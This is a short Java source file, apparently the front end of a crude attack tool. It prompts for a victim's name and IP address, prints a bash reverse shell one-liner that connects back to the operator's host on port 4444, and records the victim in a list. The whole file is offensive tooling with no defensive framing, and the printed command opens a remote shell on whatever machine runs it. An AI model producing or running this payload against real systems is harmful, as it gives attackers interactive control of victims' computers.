import java.util.Scanner;

public class Interface {
    public static void main(String[] args) {
        Esential es = new Esential();
        Scanner sc = new Scanner(System.in);

        es.setHostIP();

        System.out.println("Enter the name of victim: ");
        es.setVictimeName(sc.nextLine());
        System.out.println("Enter the IP of victim: ");
        es.setVictimeIP(sc.nextLine());
        System.out.println("Reverse shell payload:");
        System.out.println("/bin/bash -i >& /dev/tcp/"+es.getHostIP()+"/4444 0>&1");
        es.addVictim(es.getVictimeName(), es.getVictimeIP());

    }
}
